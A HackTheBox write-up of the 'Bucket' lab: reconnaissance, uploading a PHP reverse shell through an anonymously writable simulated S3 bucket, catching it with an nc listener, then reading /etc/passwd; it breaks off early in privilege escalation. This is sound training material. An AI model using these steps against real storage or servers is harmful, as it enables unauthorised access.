<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Bucket | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Pentesting against simulated AWS S3 Bucket "><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/bucket/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Bucket"><meta property="og:description" content="Pentesting against simulated AWS S3 Bucket "><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/bucket/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-04-24T22:03:47+07:00"><meta property="article:modified_time" content="2021-04-24T22:03:47+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049.png"><meta name=twitter:title content="HackTheBox - Bucket"><meta name=twitter:description content="Pentesting against simulated AWS S3 Bucket "><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Bucket","item":"https://fahmifj.github.io/hackthebox/bucket/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Bucket","name":"HackTheBox - Bucket","description":"Pentesting against simulated AWS S3 Bucket ","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Bucket, as the name implies, features a simulated Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This allows me to drop a web shell into the bucket to gain a foothold on the system. Enumerating on the system discovers several credentials from the DynamoDB and one of them is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.\nSkills Learned Pentesting AWS S3 Port Forwarding Exploiting PD4ML Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Gobuster - https://github.com/OJ/gobuster AWS CLI - https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install Reconnaissance Nmap nmap shows two open ports: 22 (SSH) and 80 (HTTP).\n→ root@iamf «bucket» «10.10.14.39» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Scanning through all the ports return the same result.\nEnumeration TCP 80 - bucket.htb Visiting this port via browser redirects to http://bucket.htb/\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://10.10.10.212 \u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e 302 Found Found The document has moved ","wordCount":"2901","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049.png","datePublished":"2021-04-24T22:03:47+07:00","dateModified":"2021-04-24T22:03:47+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/bucket/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Bucket</h1><p class=post-description>Pentesting against simulated AWS S3 Bucket</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>April 24, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>14 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---buckethtb aria-label="TCP 80 - bucket.htb">TCP 80 - bucket.htb</a></li><li><a href=#tcp-80---s3buckethtb aria-label="TCP 80 - s3.bucket.htb">TCP 80 - s3.bucket.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-roy aria-label="Shell as roy">Shell as roy</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049_hu39d88bc0f5f03acb6fd6e07e18677cae_137306_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049.png 736w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/bucket/imgs/image-20210424223554049.png alt width=736 height=468></figure><p>Bucket, as the name implies, features a simulated Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This allows me to drop a web shell into the bucket to gain a foothold on the system. Enumerating on the system discovers several credentials from the DynamoDB and one of them is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Pentesting AWS S3</li><li>Port Forwarding</li><li>Exploiting PD4ML</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Gobuster - <a href=https://github.com/OJ/gobuster>https://github.com/OJ/gobuster</a></li><li>AWS CLI - <a href=https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install>https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ mkdir nmap<span class=p>;</span> nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl>Service Info: Host: 127.0.1.1<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Scanning through all the ports return the same result.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---buckethtb>TCP 80 - bucket.htb<a class=anchor aria-hidden=true href=#tcp-80---buckethtb>#</a></h3><p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ curl -s http://10.10.10.212
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;&lt;head&gt;
</span></span><span class=line><span class=cl>&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span class=line><span class=cl>&lt;p&gt;The document has moved &lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
</span></span><span class=line><span class=cl>&lt;hr&gt;
</span></span><span class=line><span class=cl>&lt;address&gt;Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span> Server at 10.10.10.212 Port 80&lt;/address&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>10.10.10.212    bucket.htb
</span></span></code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p><p><div class=img-container><img src=imgs/image-20210422234425022.png alt=image-20210422234425022></div></p><p>Inspecting the page source discovers a vhost.</p><p><div class=img-container><img src=imgs/image-20210422234754897.png alt=image-20210422234754897></div></p><p>I&rsquo;ll add the domain name to <code>/etc/hosts</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>10.10.10.212    bucket.htb s3.bucket.htb
</span></span></code></pre></div><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p>There&rsquo;s no interesting results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5344<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 275<span class=o>]</span> 
</span></span></code></pre></div><h3 id=tcp-80---s3buckethtb>TCP 80 - s3.bucket.htb<a class=anchor aria-hidden=true href=#tcp-80---s3buckethtb>#</a></h3><p>Visiting the newly discovered hostname displays a typical json output format.</p><p><div class=img-container><img src=imgs/image-20210422235335494.png alt=image-20210422235335494></div></p><h4 id=gobuster-1>Gobuster<a class=anchor aria-hidden=true href=#gobuster-1>#</a></h4><p><code>gobuster</code> scan discovers a few web paths.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>/shell                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/health               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 54<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 275<span class=o>]</span> 
</span></span></code></pre></div><h4 id=shell>/shell<a class=anchor aria-hidden=true href=#shell>#</a></h4><p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p><p><div class=img-container><img src=imgs/image-20210424222707480.png alt=image-20210424222707480></div></p><p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «~» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ curl -sv http://s3.bucket.htb/shell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>&lt; refresh: 0<span class=p>;</span> <span class=nv>url</span><span class=o>=</span>http://444af250749d:4566/shell/
</span></span><span class=line><span class=cl>&lt; access-control-allow-origin: *
</span></span><span class=line><span class=cl>&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
</span></span><span class=line><span class=cl>&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
</span></span><span class=line><span class=cl>&lt; access-control-expose-headers: x-amz-version-id
</span></span><span class=line><span class=cl>&lt; 
</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host s3.bucket.htb left intact</span>
</span></span></code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
</span></span></code></pre></div><p>Searching some of the header names on Google reveals these are used by Amazon S3</p><p><div class=img-container><img src=imgs/image-20210425002915838.png alt=image-20210425002915838></div></p><p>Adding another <code>/</code> at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.</p><p><div class=img-container><img src=imgs/image-20210424223257481.png alt=image-20210424223257481></div></p><h4 id=health>/health<a class=anchor aria-hidden=true href=#health>#</a></h4><p><code>/health</code> is probably an endpoint to monitor the service status.</p><p><div class=img-container><img src=imgs/image-20210422235825937.png alt=image-20210422235825937></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=aws-s3>AWS S3<a class=anchor aria-hidden=true href=#aws-s3>#</a></h4><p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href=https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install>aws cli</a>. You can find the user guide <a href=https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets>here</a>.</p><p>Usage in general:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>aws [options] s3 &lt;subcommand&gt; [parameters]
</span></span></code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p><blockquote><p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 ls --endpoint-url<span class=o>=</span>http://s3.bucket.htb 
</span></span><span class=line><span class=cl>You must specify a region. You can also configure your region by running <span class=s2>&#34;aws configure&#34;</span>.
</span></span></code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws configure
</span></span><span class=line><span class=cl>AWS Access Key ID <span class=o>[</span>None<span class=o>]</span>:
</span></span><span class=line><span class=cl>AWS Secret Access Key <span class=o>[</span>None<span class=o>]</span>:
</span></span><span class=line><span class=cl>Default region name <span class=o>[</span>None<span class=o>]</span>: us-east-1
</span></span><span class=line><span class=cl>Default output format <span class=o>[</span>None<span class=o>]</span>:
</span></span></code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 ls --endpoint-url<span class=o>=</span>http://s3.bucket.htb 
</span></span><span class=line><span class=cl>2020-10-21 09:16:03 adserver
</span></span></code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 ls s3://adserver --endpoint-url<span class=o>=</span>http://s3.bucket.htb
</span></span><span class=line><span class=cl>                           PRE images/
</span></span><span class=line><span class=cl>2020-10-21 09:22:04       <span class=m>5344</span> index.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 ls s3://adserver/images/ --endpoint-url<span class=o>=</span>http://s3.bucket.htb
</span></span><span class=line><span class=cl>2020-10-21 09:52:04      <span class=m>37840</span> bug.jpg
</span></span><span class=line><span class=cl>2020-10-21 09:52:04      <span class=m>51485</span> cloud.png
</span></span><span class=line><span class=cl>2020-10-21 09:52:04      <span class=m>16486</span> malware.png
</span></span></code></pre></div><p>These files are the same files seen previously on <code>bucket.htb</code>.</p><h4 id=php-reverse-shell-upload-via-s3>PHP Reverse Shell upload via S3<a class=anchor aria-hidden=true href=#php-reverse-shell-upload-via-s3>#</a></h4><p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href=https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy>source</a>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>aws s3 cp &lt;source&gt; &lt;target&gt; <span class=o>[</span>--options<span class=o>]</span>
</span></span></code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test file and upload it to the bucket.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class=o>=</span>http://s3.bucket.htb
</span></span><span class=line><span class=cl>upload: ./iamf-test.php to s3://adserver/iamf-test.php 
</span></span></code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 ls s3://adserver/ --endpoint-url<span class=o>=</span>http://s3.bucket.htb 
</span></span><span class=line><span class=cl>                           PRE images/
</span></span><span class=line><span class=cl>2021-04-22 14:05:15         <span class=m>21</span> iamf-test.php
</span></span><span class=line><span class=cl>2021-04-22 14:05:04       <span class=m>5344</span> index.html
</span></span></code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of PHP code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
</span></span><span class=line><span class=cl>&lt;?php <span class=nb>echo</span> <span class=s2>&#34;IamF&#34;</span> ?&gt;
</span></span><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ curl -s http://bucket.htb/iamf-test.php
</span></span><span class=line><span class=cl>IamF
</span></span></code></pre></div><p>Now I can try to drop a <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>PHP reverse shell</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class=o>=</span>http://s3.bucket.htb
</span></span></code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ curl -s http://bucket.htb/iamf.php
</span></span></code></pre></div><p>I have a shell now my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t pop a shell).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ rlwrap nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.39<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.212<span class=o>]</span> <span class=m>58352</span>
</span></span><span class=line><span class=cl>Linux bucket 5.4.0-48-generic <span class=c1>#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 18:14:02 up 13:18,  <span class=m>0</span> users,  load average: 0.03, 0.04, 0.04
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1050<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@bucket:/$ 
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-roy>Shell as roy<a class=anchor aria-hidden=true href=#shell-as-roy>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p><code>roy</code> is the only user in this box.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bucket:/$ cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>roy:x:1000:1000:,,,:/home/roy:/bin/bash
</span></span></code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@bucket:/var/www$ ls -la /home/roy
</span></span><span class=line><span class=cl>total <span class=m>44</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> roy  roy  <span class=m>4096</span> Apr <span class=m>22</span> 12:03 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Sep <span class=m>16</span>  <span class=m>2020</span> ..
